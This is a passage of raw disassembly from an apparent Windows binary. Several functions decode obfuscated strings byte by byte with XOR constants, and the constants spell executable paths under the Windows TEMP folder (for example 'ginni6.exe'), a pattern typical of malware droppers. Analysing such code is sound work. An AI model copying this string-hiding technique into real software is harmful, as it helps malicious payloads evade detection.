   1400032db:	48 83 3d 1d 3c 02 00 	cmpq   $0xf,0x23c1d(%rip)        # 0x140026f00
   1400032e2:	0f 
   1400032e3:	b8 0e 00 00 00       	mov    $0xe,%eax
   1400032e8:	4c 0f 47 05 f8 3b 02 	cmova  0x23bf8(%rip),%r8        # 0x140026ee8
   1400032ef:	00 
   1400032f0:	33 d2                	xor    %edx,%edx
   1400032f2:	48 f7 f1             	div    %rcx
   1400032f5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400032fa:	34 50                	xor    $0x50,%al
   1400032fc:	41 88 40 0e          	mov    %al,0xe(%r8)
   140003300:	4c 8b c3             	mov    %rbx,%r8
   140003303:	48 83 3d f5 3b 02 00 	cmpq   $0xf,0x23bf5(%rip)        # 0x140026f00
   14000330a:	0f 
   14000330b:	b8 0f 00 00 00       	mov    $0xf,%eax
   140003310:	4c 0f 47 05 d0 3b 02 	cmova  0x23bd0(%rip),%r8        # 0x140026ee8
   140003317:	00 
   140003318:	33 d2                	xor    %edx,%edx
   14000331a:	48 f7 f1             	div    %rcx
   14000331d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003322:	34 5c                	xor    $0x5c,%al
   140003324:	41 88 40 0f          	mov    %al,0xf(%r8)
   140003328:	4c 8b c3             	mov    %rbx,%r8
   14000332b:	48 83 3d cd 3b 02 00 	cmpq   $0xf,0x23bcd(%rip)        # 0x140026f00
   140003332:	0f 
   140003333:	b8 10 00 00 00       	mov    $0x10,%eax
   140003338:	4c 0f 47 05 a8 3b 02 	cmova  0x23ba8(%rip),%r8        # 0x140026ee8
   14000333f:	00 
   140003340:	33 d2                	xor    %edx,%edx
   140003342:	48 f7 f1             	div    %rcx
   140003345:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000334a:	34 67                	xor    $0x67,%al
   14000334c:	41 88 40 10          	mov    %al,0x10(%r8)
   140003350:	4c 8b c3             	mov    %rbx,%r8
   140003353:	48 83 3d a5 3b 02 00 	cmpq   $0xf,0x23ba5(%rip)        # 0x140026f00
   14000335a:	0f 
   14000335b:	b8 11 00 00 00       	mov    $0x11,%eax
   140003360:	4c 0f 47 05 80 3b 02 	cmova  0x23b80(%rip),%r8        # 0x140026ee8
   140003367:	00 
   140003368:	33 d2                	xor    %edx,%edx
   14000336a:	48 f7 f1             	div    %rcx
   14000336d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003372:	34 69                	xor    $0x69,%al
   140003374:	41 88 40 11          	mov    %al,0x11(%r8)
   140003378:	4c 8b c3             	mov    %rbx,%r8
   14000337b:	48 83 3d 7d 3b 02 00 	cmpq   $0xf,0x23b7d(%rip)        # 0x140026f00
   140003382:	0f 
   140003383:	b8 12 00 00 00       	mov    $0x12,%eax
   140003388:	4c 0f 47 05 58 3b 02 	cmova  0x23b58(%rip),%r8        # 0x140026ee8
   14000338f:	00 
   140003390:	33 d2                	xor    %edx,%edx
   140003392:	48 f7 f1             	div    %rcx
   140003395:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000339a:	34 61                	xor    $0x61,%al
   14000339c:	41 88 40 12          	mov    %al,0x12(%r8)
   1400033a0:	4c 8b c3             	mov    %rbx,%r8
   1400033a3:	48 83 3d 55 3b 02 00 	cmpq   $0xf,0x23b55(%rip)        # 0x140026f00
   1400033aa:	0f 
   1400033ab:	b8 13 00 00 00       	mov    $0x13,%eax
   1400033b0:	4c 0f 47 05 30 3b 02 	cmova  0x23b30(%rip),%r8        # 0x140026ee8
   1400033b7:	00 
   1400033b8:	33 d2                	xor    %edx,%edx
   1400033ba:	48 f7 f1             	div    %rcx
   1400033bd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400033c2:	34 6e                	xor    $0x6e,%al
   1400033c4:	41 88 40 13          	mov    %al,0x13(%r8)
   1400033c8:	4c 8b c3             	mov    %rbx,%r8
   1400033cb:	48 83 3d 2d 3b 02 00 	cmpq   $0xf,0x23b2d(%rip)        # 0x140026f00
   1400033d2:	0f 
   1400033d3:	b8 14 00 00 00       	mov    $0x14,%eax
   1400033d8:	4c 0f 47 05 08 3b 02 	cmova  0x23b08(%rip),%r8        # 0x140026ee8
   1400033df:	00 
   1400033e0:	33 d2                	xor    %edx,%edx
   1400033e2:	48 f7 f1             	div    %rcx
   1400033e5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400033ea:	34 6e                	xor    $0x6e,%al
   1400033ec:	41 88 40 14          	mov    %al,0x14(%r8)
   1400033f0:	4c 8b c3             	mov    %rbx,%r8
   1400033f3:	48 83 3d 05 3b 02 00 	cmpq   $0xf,0x23b05(%rip)        # 0x140026f00
   1400033fa:	0f 
   1400033fb:	b8 15 00 00 00       	mov    $0x15,%eax
   140003400:	4c 0f 47 05 e0 3a 02 	cmova  0x23ae0(%rip),%r8        # 0x140026ee8
   140003407:	00 
   140003408:	33 d2                	xor    %edx,%edx
   14000340a:	48 f7 f1             	div    %rcx
   14000340d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003412:	34 69                	xor    $0x69,%al
   140003414:	41 88 40 15          	mov    %al,0x15(%r8)
   140003418:	4c 8b c3             	mov    %rbx,%r8
   14000341b:	48 83 3d dd 3a 02 00 	cmpq   $0xf,0x23add(%rip)        # 0x140026f00
   140003422:	0f 
   140003423:	b8 16 00 00 00       	mov    $0x16,%eax
   140003428:	4c 0f 47 05 b8 3a 02 	cmova  0x23ab8(%rip),%r8        # 0x140026ee8
   14000342f:	00 
   140003430:	33 d2                	xor    %edx,%edx
   140003432:	48 f7 f1             	div    %rcx
   140003435:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000343a:	34 36                	xor    $0x36,%al
   14000343c:	41 88 40 16          	mov    %al,0x16(%r8)
   140003440:	4c 8b c3             	mov    %rbx,%r8
   140003443:	48 83 3d b5 3a 02 00 	cmpq   $0xf,0x23ab5(%rip)        # 0x140026f00
   14000344a:	0f 
   14000344b:	b8 17 00 00 00       	mov    $0x17,%eax
   140003450:	4c 0f 47 05 90 3a 02 	cmova  0x23a90(%rip),%r8        # 0x140026ee8
   140003457:	00 
   140003458:	33 d2                	xor    %edx,%edx
   14000345a:	48 f7 f1             	div    %rcx
   14000345d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003462:	34 2e                	xor    $0x2e,%al
   140003464:	41 88 40 17          	mov    %al,0x17(%r8)
   140003468:	4c 8b c3             	mov    %rbx,%r8
   14000346b:	48 83 3d 8d 3a 02 00 	cmpq   $0xf,0x23a8d(%rip)        # 0x140026f00
   140003472:	0f 
   140003473:	b8 18 00 00 00       	mov    $0x18,%eax
   140003478:	4c 0f 47 05 68 3a 02 	cmova  0x23a68(%rip),%r8        # 0x140026ee8
   14000347f:	00 
   140003480:	33 d2                	xor    %edx,%edx
   140003482:	48 f7 f1             	div    %rcx
   140003485:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000348a:	34 65                	xor    $0x65,%al
   14000348c:	41 88 40 18          	mov    %al,0x18(%r8)
   140003490:	4c 8b c3             	mov    %rbx,%r8
   140003493:	48 83 3d 65 3a 02 00 	cmpq   $0xf,0x23a65(%rip)        # 0x140026f00
   14000349a:	0f 
   14000349b:	b8 19 00 00 00       	mov    $0x19,%eax
   1400034a0:	4c 0f 47 05 40 3a 02 	cmova  0x23a40(%rip),%r8        # 0x140026ee8
   1400034a7:	00 
   1400034a8:	33 d2                	xor    %edx,%edx
   1400034aa:	48 f7 f1             	div    %rcx
   1400034ad:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400034b2:	34 78                	xor    $0x78,%al
   1400034b4:	41 88 40 19          	mov    %al,0x19(%r8)
   1400034b8:	4c 8b c3             	mov    %rbx,%r8
   1400034bb:	48 83 3d 3d 3a 02 00 	cmpq   $0xf,0x23a3d(%rip)        # 0x140026f00
   1400034c2:	0f 
   1400034c3:	b8 1a 00 00 00       	mov    $0x1a,%eax
   1400034c8:	4c 0f 47 05 18 3a 02 	cmova  0x23a18(%rip),%r8        # 0x140026ee8
   1400034cf:	00 
   1400034d0:	33 d2                	xor    %edx,%edx
   1400034d2:	48 f7 f1             	div    %rcx
   1400034d5:	48 8b c3             	mov    %rbx,%rax
   1400034d8:	42 0f b6 0c 0a       	movzbl (%rdx,%r9,1),%ecx
   1400034dd:	80 f1 65             	xor    $0x65,%cl
   1400034e0:	41 88 48 1a          	mov    %cl,0x1a(%r8)
   1400034e4:	48 83 c4 30          	add    $0x30,%rsp
   1400034e8:	5b                   	pop    %rbx
   1400034e9:	c3                   	ret
   1400034ea:	cc                   	int3
   1400034eb:	cc                   	int3
   1400034ec:	cc                   	int3
   1400034ed:	cc                   	int3
   1400034ee:	cc                   	int3
   1400034ef:	cc                   	int3
   1400034f0:	40 53                	rex push %rbx
   1400034f2:	48 83 ec 30          	sub    $0x30,%rsp
   1400034f6:	48 8d 1d 0b 39 02 00 	lea    0x2390b(%rip),%rbx        # 0x140026e08
   1400034fd:	ba 1b 00 00 00       	mov    $0x1b,%edx
   140003502:	48 8b cb             	mov    %rbx,%rcx
   140003505:	e8 06 2e 00 00       	call   0x140006310
   14000350a:	4c 8d 0d af b3 00 00 	lea    0xb3af(%rip),%r9        # 0x14000e8c0
   140003511:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140003518:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000351f:	00 
   140003520:	48 ff c1             	inc    %rcx
   140003523:	41 80 3c 09 00       	cmpb   $0x0,(%r9,%rcx,1)
   140003528:	75 f6                	jne    0x140003520
   14000352a:	48 83 3d ee 38 02 00 	cmpq   $0xf,0x238ee(%rip)        # 0x140026e20
   140003531:	0f 
   140003532:	48 8b c3             	mov    %rbx,%rax
   140003535:	4c 8b c3             	mov    %rbx,%r8
   140003538:	48 0f 47 05 c8 38 02 	cmova  0x238c8(%rip),%rax        # 0x140026e08
   14000353f:	00 
   140003540:	c6 00 2c             	movb   $0x2c,(%rax)
   140003543:	b8 01 00 00 00       	mov    $0x1,%eax
   140003548:	48 83 3d d0 38 02 00 	cmpq   $0xf,0x238d0(%rip)        # 0x140026e20
   14000354f:	0f 
   140003550:	4c 0f 47 05 b0 38 02 	cmova  0x238b0(%rip),%r8        # 0x140026e08
   140003557:	00 
   140003558:	33 d2                	xor    %edx,%edx
   14000355a:	48 f7 f1             	div    %rcx
   14000355d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003562:	34 3a                	xor    $0x3a,%al
   140003564:	41 88 40 01          	mov    %al,0x1(%r8)
   140003568:	4c 8b c3             	mov    %rbx,%r8
   14000356b:	48 83 3d ad 38 02 00 	cmpq   $0xf,0x238ad(%rip)        # 0x140026e20
   140003572:	0f 
   140003573:	b8 02 00 00 00       	mov    $0x2,%eax
   140003578:	4c 0f 47 05 88 38 02 	cmova  0x23888(%rip),%r8        # 0x140026e08
   14000357f:	00 
   140003580:	33 d2                	xor    %edx,%edx
   140003582:	48 f7 f1             	div    %rcx
   140003585:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000358a:	34 5c                	xor    $0x5c,%al
   14000358c:	41 88 40 02          	mov    %al,0x2(%r8)
   140003590:	4c 8b c3             	mov    %rbx,%r8
   140003593:	48 83 3d 85 38 02 00 	cmpq   $0xf,0x23885(%rip)        # 0x140026e20
   14000359a:	0f 
   14000359b:	b8 03 00 00 00       	mov    $0x3,%eax
   1400035a0:	4c 0f 47 05 60 38 02 	cmova  0x23860(%rip),%r8        # 0x140026e08
   1400035a7:	00 
   1400035a8:	33 d2                	xor    %edx,%edx
   1400035aa:	48 f7 f1             	div    %rcx
   1400035ad:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400035b2:	34 57                	xor    $0x57,%al
   1400035b4:	41 88 40 03          	mov    %al,0x3(%r8)
   1400035b8:	4c 8b c3             	mov    %rbx,%r8
   1400035bb:	48 83 3d 5d 38 02 00 	cmpq   $0xf,0x2385d(%rip)        # 0x140026e20
   1400035c2:	0f 
   1400035c3:	b8 04 00 00 00       	mov    $0x4,%eax
   1400035c8:	4c 0f 47 05 38 38 02 	cmova  0x23838(%rip),%r8        # 0x140026e08
   1400035cf:	00 
   1400035d0:	33 d2                	xor    %edx,%edx
   1400035d2:	48 f7 f1             	div    %rcx
   1400035d5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400035da:	34 69                	xor    $0x69,%al
   1400035dc:	41 88 40 04          	mov    %al,0x4(%r8)
   1400035e0:	4c 8b c3             	mov    %rbx,%r8
   1400035e3:	48 83 3d 35 38 02 00 	cmpq   $0xf,0x23835(%rip)        # 0x140026e20
   1400035ea:	0f 
   1400035eb:	b8 05 00 00 00       	mov    $0x5,%eax
   1400035f0:	4c 0f 47 05 10 38 02 	cmova  0x23810(%rip),%r8        # 0x140026e08
   1400035f7:	00 
   1400035f8:	33 d2                	xor    %edx,%edx
   1400035fa:	48 f7 f1             	div    %rcx
   1400035fd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003602:	34 6e                	xor    $0x6e,%al
   140003604:	41 88 40 05          	mov    %al,0x5(%r8)
   140003608:	4c 8b c3             	mov    %rbx,%r8
   14000360b:	48 83 3d 0d 38 02 00 	cmpq   $0xf,0x2380d(%rip)        # 0x140026e20
   140003612:	0f 
   140003613:	b8 06 00 00 00       	mov    $0x6,%eax
   140003618:	4c 0f 47 05 e8 37 02 	cmova  0x237e8(%rip),%r8        # 0x140026e08
   14000361f:	00 
   140003620:	33 d2                	xor    %edx,%edx
   140003622:	48 f7 f1             	div    %rcx
   140003625:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000362a:	34 64                	xor    $0x64,%al
   14000362c:	41 88 40 06          	mov    %al,0x6(%r8)
   140003630:	4c 8b c3             	mov    %rbx,%r8
   140003633:	48 83 3d e5 37 02 00 	cmpq   $0xf,0x237e5(%rip)        # 0x140026e20
   14000363a:	0f 
   14000363b:	b8 07 00 00 00       	mov    $0x7,%eax
   140003640:	4c 0f 47 05 c0 37 02 	cmova  0x237c0(%rip),%r8        # 0x140026e08
   140003647:	00 
   140003648:	33 d2                	xor    %edx,%edx
   14000364a:	48 f7 f1             	div    %rcx
   14000364d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003652:	34 6f                	xor    $0x6f,%al
   140003654:	41 88 40 07          	mov    %al,0x7(%r8)
   140003658:	4c 8b c3             	mov    %rbx,%r8
   14000365b:	48 83 3d bd 37 02 00 	cmpq   $0xf,0x237bd(%rip)        # 0x140026e20
   140003662:	0f 
   140003663:	b8 08 00 00 00       	mov    $0x8,%eax
   140003668:	4c 0f 47 05 98 37 02 	cmova  0x23798(%rip),%r8        # 0x140026e08
   14000366f:	00 
   140003670:	33 d2                	xor    %edx,%edx
   140003672:	48 f7 f1             	div    %rcx
   140003675:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000367a:	34 77                	xor    $0x77,%al
   14000367c:	41 88 40 08          	mov    %al,0x8(%r8)
   140003680:	4c 8b c3             	mov    %rbx,%r8
   140003683:	48 83 3d 95 37 02 00 	cmpq   $0xf,0x23795(%rip)        # 0x140026e20
   14000368a:	0f 
   14000368b:	b8 09 00 00 00       	mov    $0x9,%eax
   140003690:	4c 0f 47 05 70 37 02 	cmova  0x23770(%rip),%r8        # 0x140026e08
   140003697:	00 
   140003698:	33 d2                	xor    %edx,%edx
   14000369a:	48 f7 f1             	div    %rcx
   14000369d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400036a2:	34 73                	xor    $0x73,%al
   1400036a4:	41 88 40 09          	mov    %al,0x9(%r8)
   1400036a8:	4c 8b c3             	mov    %rbx,%r8
   1400036ab:	48 83 3d 6d 37 02 00 	cmpq   $0xf,0x2376d(%rip)        # 0x140026e20
   1400036b2:	0f 
   1400036b3:	b8 0a 00 00 00       	mov    $0xa,%eax
   1400036b8:	4c 0f 47 05 48 37 02 	cmova  0x23748(%rip),%r8        # 0x140026e08
   1400036bf:	00 
   1400036c0:	33 d2                	xor    %edx,%edx
   1400036c2:	48 f7 f1             	div    %rcx
   1400036c5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400036ca:	34 5c                	xor    $0x5c,%al
   1400036cc:	41 88 40 0a          	mov    %al,0xa(%r8)
   1400036d0:	4c 8b c3             	mov    %rbx,%r8
   1400036d3:	48 83 3d 45 37 02 00 	cmpq   $0xf,0x23745(%rip)        # 0x140026e20
   1400036da:	0f 
   1400036db:	b8 0b 00 00 00       	mov    $0xb,%eax
   1400036e0:	4c 0f 47 05 20 37 02 	cmova  0x23720(%rip),%r8        # 0x140026e08
   1400036e7:	00 
   1400036e8:	33 d2                	xor    %edx,%edx
   1400036ea:	48 f7 f1             	div    %rcx
   1400036ed:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400036f2:	34 54                	xor    $0x54,%al
   1400036f4:	41 88 40 0b          	mov    %al,0xb(%r8)
   1400036f8:	4c 8b c3             	mov    %rbx,%r8
   1400036fb:	48 83 3d 1d 37 02 00 	cmpq   $0xf,0x2371d(%rip)        # 0x140026e20
   140003702:	0f 
   140003703:	b8 0c 00 00 00       	mov    $0xc,%eax
   140003708:	4c 0f 47 05 f8 36 02 	cmova  0x236f8(%rip),%r8        # 0x140026e08
   14000370f:	00 
   140003710:	33 d2                	xor    %edx,%edx
   140003712:	48 f7 f1             	div    %rcx
   140003715:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000371a:	34 45                	xor    $0x45,%al
   14000371c:	41 88 40 0c          	mov    %al,0xc(%r8)
   140003720:	4c 8b c3             	mov    %rbx,%r8
   140003723:	48 83 3d f5 36 02 00 	cmpq   $0xf,0x236f5(%rip)        # 0x140026e20
   14000372a:	0f 
   14000372b:	b8 0d 00 00 00       	mov    $0xd,%eax
   140003730:	4c 0f 47 05 d0 36 02 	cmova  0x236d0(%rip),%r8        # 0x140026e08
   140003737:	00 
   140003738:	33 d2                	xor    %edx,%edx
   14000373a:	48 f7 f1             	div    %rcx
   14000373d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003742:	34 4d                	xor    $0x4d,%al
   140003744:	41 88 40 0d          	mov    %al,0xd(%r8)
   140003748:	4c 8b c3             	mov    %rbx,%r8
   14000374b:	48 83 3d cd 36 02 00 	cmpq   $0xf,0x236cd(%rip)        # 0x140026e20
   140003752:	0f 
   140003753:	b8 0e 00 00 00       	mov    $0xe,%eax
   140003758:	4c 0f 47 05 a8 36 02 	cmova  0x236a8(%rip),%r8        # 0x140026e08
   14000375f:	00 
   140003760:	33 d2                	xor    %edx,%edx
   140003762:	48 f7 f1             	div    %rcx
   140003765:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000376a:	34 50                	xor    $0x50,%al
   14000376c:	41 88 40 0e          	mov    %al,0xe(%r8)
   140003770:	4c 8b c3             	mov    %rbx,%r8
   140003773:	48 83 3d a5 36 02 00 	cmpq   $0xf,0x236a5(%rip)        # 0x140026e20
   14000377a:	0f 
   14000377b:	b8 0f 00 00 00       	mov    $0xf,%eax
   140003780:	4c 0f 47 05 80 36 02 	cmova  0x23680(%rip),%r8        # 0x140026e08
   140003787:	00 
   140003788:	33 d2                	xor    %edx,%edx
   14000378a:	48 f7 f1             	div    %rcx
   14000378d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003792:	34 5c                	xor    $0x5c,%al
   140003794:	41 88 40 0f          	mov    %al,0xf(%r8)
   140003798:	4c 8b c3             	mov    %rbx,%r8
   14000379b:	48 83 3d 7d 36 02 00 	cmpq   $0xf,0x2367d(%rip)        # 0x140026e20
   1400037a2:	0f 
   1400037a3:	b8 10 00 00 00       	mov    $0x10,%eax
   1400037a8:	4c 0f 47 05 58 36 02 	cmova  0x23658(%rip),%r8        # 0x140026e08
   1400037af:	00 
   1400037b0:	33 d2                	xor    %edx,%edx
   1400037b2:	48 f7 f1             	div    %rcx
   1400037b5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400037ba:	34 67                	xor    $0x67,%al
   1400037bc:	41 88 40 10          	mov    %al,0x10(%r8)
   1400037c0:	4c 8b c3             	mov    %rbx,%r8
   1400037c3:	48 83 3d 55 36 02 00 	cmpq   $0xf,0x23655(%rip)        # 0x140026e20
   1400037ca:	0f 
   1400037cb:	b8 11 00 00 00       	mov    $0x11,%eax
   1400037d0:	4c 0f 47 05 30 36 02 	cmova  0x23630(%rip),%r8        # 0x140026e08
   1400037d7:	00 
   1400037d8:	33 d2                	xor    %edx,%edx
   1400037da:	48 f7 f1             	div    %rcx
   1400037dd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400037e2:	34 69                	xor    $0x69,%al
   1400037e4:	41 88 40 11          	mov    %al,0x11(%r8)
   1400037e8:	4c 8b c3             	mov    %rbx,%r8
   1400037eb:	48 83 3d 2d 36 02 00 	cmpq   $0xf,0x2362d(%rip)        # 0x140026e20
   1400037f2:	0f 
   1400037f3:	b8 12 00 00 00       	mov    $0x12,%eax
   1400037f8:	4c 0f 47 05 08 36 02 	cmova  0x23608(%rip),%r8        # 0x140026e08
   1400037ff:	00 
   140003800:	33 d2                	xor    %edx,%edx
   140003802:	48 f7 f1             	div    %rcx
   140003805:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000380a:	34 61                	xor    $0x61,%al
   14000380c:	41 88 40 12          	mov    %al,0x12(%r8)
   140003810:	4c 8b c3             	mov    %rbx,%r8
   140003813:	48 83 3d 05 36 02 00 	cmpq   $0xf,0x23605(%rip)        # 0x140026e20
   14000381a:	0f 
   14000381b:	b8 13 00 00 00       	mov    $0x13,%eax
   140003820:	4c 0f 47 05 e0 35 02 	cmova  0x235e0(%rip),%r8        # 0x140026e08
   140003827:	00 
   140003828:	33 d2                	xor    %edx,%edx
   14000382a:	48 f7 f1             	div    %rcx
   14000382d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003832:	34 6e                	xor    $0x6e,%al
   140003834:	41 88 40 13          	mov    %al,0x13(%r8)
   140003838:	4c 8b c3             	mov    %rbx,%r8
   14000383b:	48 83 3d dd 35 02 00 	cmpq   $0xf,0x235dd(%rip)        # 0x140026e20
   140003842:	0f 
   140003843:	b8 14 00 00 00       	mov    $0x14,%eax
   140003848:	4c 0f 47 05 b8 35 02 	cmova  0x235b8(%rip),%r8        # 0x140026e08
   14000384f:	00 
   140003850:	33 d2                	xor    %edx,%edx
   140003852:	48 f7 f1             	div    %rcx
   140003855:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000385a:	34 6e                	xor    $0x6e,%al
   14000385c:	41 88 40 14          	mov    %al,0x14(%r8)
   140003860:	4c 8b c3             	mov    %rbx,%r8
   140003863:	48 83 3d b5 35 02 00 	cmpq   $0xf,0x235b5(%rip)        # 0x140026e20
   14000386a:	0f 
   14000386b:	b8 15 00 00 00       	mov    $0x15,%eax
   140003870:	4c 0f 47 05 90 35 02 	cmova  0x23590(%rip),%r8        # 0x140026e08
   140003877:	00 
   140003878:	33 d2                	xor    %edx,%edx
   14000387a:	48 f7 f1             	div    %rcx
   14000387d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003882:	34 69                	xor    $0x69,%al
   140003884:	41 88 40 15          	mov    %al,0x15(%r8)
   140003888:	4c 8b c3             	mov    %rbx,%r8
   14000388b:	48 83 3d 8d 35 02 00 	cmpq   $0xf,0x2358d(%rip)        # 0x140026e20
   140003892:	0f 
   140003893:	b8 16 00 00 00       	mov    $0x16,%eax
   140003898:	4c 0f 47 05 68 35 02 	cmova  0x23568(%rip),%r8        # 0x140026e08
   14000389f:	00 
   1400038a0:	33 d2                	xor    %edx,%edx
   1400038a2:	48 f7 f1             	div    %rcx
   1400038a5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400038aa:	34 37                	xor    $0x37,%al
   1400038ac:	41 88 40 16          	mov    %al,0x16(%r8)
   1400038b0:	4c 8b c3             	mov    %rbx,%r8
   1400038b3:	48 83 3d 65 35 02 00 	cmpq   $0xf,0x23565(%rip)        # 0x140026e20
   1400038ba:	0f 
   1400038bb:	b8 17 00 00 00       	mov    $0x17,%eax
   1400038c0:	4c 0f 47 05 40 35 02 	cmova  0x23540(%rip),%r8        # 0x140026e08
   1400038c7:	00 
   1400038c8:	33 d2                	xor    %edx,%edx
   1400038ca:	48 f7 f1             	div    %rcx
   1400038cd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400038d2:	34 2e                	xor    $0x2e,%al
   1400038d4:	41 88 40 17          	mov    %al,0x17(%r8)
   1400038d8:	4c 8b c3             	mov    %rbx,%r8
   1400038db:	48 83 3d 3d 35 02 00 	cmpq   $0xf,0x2353d(%rip)        # 0x140026e20
   1400038e2:	0f 
   1400038e3:	b8 18 00 00 00       	mov    $0x18,%eax
   1400038e8:	4c 0f 47 05 18 35 02 	cmova  0x23518(%rip),%r8        # 0x140026e08
   1400038ef:	00 
   1400038f0:	33 d2                	xor    %edx,%edx
   1400038f2:	48 f7 f1             	div    %rcx
   1400038f5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400038fa:	34 65                	xor    $0x65,%al
   1400038fc:	41 88 40 18          	mov    %al,0x18(%r8)
   140003900:	4c 8b c3             	mov    %rbx,%r8
   140003903:	48 83 3d 15 35 02 00 	cmpq   $0xf,0x23515(%rip)        # 0x140026e20
   14000390a:	0f 
   14000390b:	b8 19 00 00 00       	mov    $0x19,%eax
   140003910:	4c 0f 47 05 f0 34 02 	cmova  0x234f0(%rip),%r8        # 0x140026e08
   140003917:	00 
   140003918:	33 d2                	xor    %edx,%edx
   14000391a:	48 f7 f1             	div    %rcx
   14000391d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003922:	34 78                	xor    $0x78,%al
   140003924:	41 88 40 19          	mov    %al,0x19(%r8)
   140003928:	4c 8b c3             	mov    %rbx,%r8
   14000392b:	48 83 3d ed 34 02 00 	cmpq   $0xf,0x234ed(%rip)        # 0x140026e20
   140003932:	0f 
   140003933:	b8 1a 00 00 00       	mov    $0x1a,%eax
   140003938:	4c 0f 47 05 c8 34 02 	cmova  0x234c8(%rip),%r8        # 0x140026e08
   14000393f:	00 
   140003940:	33 d2                	xor    %edx,%edx
   140003942:	48 f7 f1             	div    %rcx
   140003945:	48 8b c3             	mov    %rbx,%rax
   140003948:	42 0f b6 0c 0a       	movzbl (%rdx,%r9,1),%ecx
   14000394d:	80 f1 65             	xor    $0x65,%cl
   140003950:	41 88 48 1a          	mov    %cl,0x1a(%r8)
   140003954:	48 83 c4 30          	add    $0x30,%rsp
   140003958:	5b                   	pop    %rbx
   140003959:	c3                   	ret
   14000395a:	cc                   	int3
   14000395b:	cc                   	int3
   14000395c:	cc                   	int3
   14000395d:	cc                   	int3
   14000395e:	cc                   	int3
   14000395f:	cc                   	int3
   140003960:	40 53                	rex push %rbx
   140003962:	48 83 ec 30          	sub    $0x30,%rsp
   140003966:	48 8d 1d db 35 02 00 	lea    0x235db(%rip),%rbx        # 0x140026f48
   14000396d:	ba 1b 00 00 00       	mov    $0x1b,%edx
   140003972:	48 8b cb             	mov    %rbx,%rcx
   140003975:	e8 96 29 00 00       	call   0x140006310
   14000397a:	4c 8d 0d 4f af 00 00 	lea    0xaf4f(%rip),%r9        # 0x14000e8d0
   140003981:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140003988:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000398f:	00 
   140003990:	48 ff c1             	inc    %rcx
   140003993:	41 80 3c 09 00       	cmpb   $0x0,(%r9,%rcx,1)
   140003998:	75 f6                	jne    0x140003990
   14000399a:	48 83 3d be 35 02 00 	cmpq   $0xf,0x235be(%rip)        # 0x140026f60
   1400039a1:	0f 
   1400039a2:	48 8b c3             	mov    %rbx,%rax
   1400039a5:	4c 8b c3             	mov    %rbx,%r8
   1400039a8:	48 0f 47 05 98 35 02 	cmova  0x23598(%rip),%rax        # 0x140026f48
   1400039af:	00 
   1400039b0:	c6 00 25             	movb   $0x25,(%rax)
   1400039b3:	b8 01 00 00 00       	mov    $0x1,%eax
   1400039b8:	48 83 3d a0 35 02 00 	cmpq   $0xf,0x235a0(%rip)        # 0x140026f60
   1400039bf:	0f 
   1400039c0:	4c 0f 47 05 80 35 02 	cmova  0x23580(%rip),%r8        # 0x140026f48
   1400039c7:	00 
   1400039c8:	33 d2                	xor    %edx,%edx
   1400039ca:	48 f7 f1             	div    %rcx
   1400039cd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400039d2:	34 3a                	xor    $0x3a,%al
   1400039d4:	41 88 40 01          	mov    %al,0x1(%r8)
   1400039d8:	4c 8b c3             	mov    %rbx,%r8
   1400039db:	48 83 3d 7d 35 02 00 	cmpq   $0xf,0x2357d(%rip)        # 0x140026f60
   1400039e2:	0f 
   1400039e3:	b8 02 00 00 00       	mov    $0x2,%eax
   1400039e8:	4c 0f 47 05 58 35 02 	cmova  0x23558(%rip),%r8        # 0x140026f48
   1400039ef:	00 
   1400039f0:	33 d2                	xor    %edx,%edx
   1400039f2:	48 f7 f1             	div    %rcx
   1400039f5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400039fa:	34 5c                	xor    $0x5c,%al
   1400039fc:	41 88 40 02          	mov    %al,0x2(%r8)
